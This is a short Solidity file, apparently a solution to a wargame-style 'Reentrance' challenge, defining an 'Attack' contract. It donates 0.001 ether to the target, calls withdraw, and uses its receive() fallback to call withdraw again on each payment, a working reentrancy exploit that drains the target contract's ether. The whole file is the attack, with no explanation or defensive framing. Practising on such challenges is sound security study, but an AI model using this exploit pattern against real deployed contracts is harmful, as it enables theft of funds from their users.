// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IRentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;

    receive() external payable;
}

contract Attack {
    address payable public reentrance;

    constructor(address _reentrance) public {
        reentrance = payable(_reentrance);
    }

    function attack() public payable {
        require(msg.value == 0.001 ether);

        IRentrance instance = IRentrance(reentrance);

        instance.donate{value: msg.value}(address(this));
        instance.withdraw(msg.value);
    }

    receive() external payable {
        IRentrance instance = IRentrance(reentrance);

        instance.withdraw(0.001 ether);
    }
}
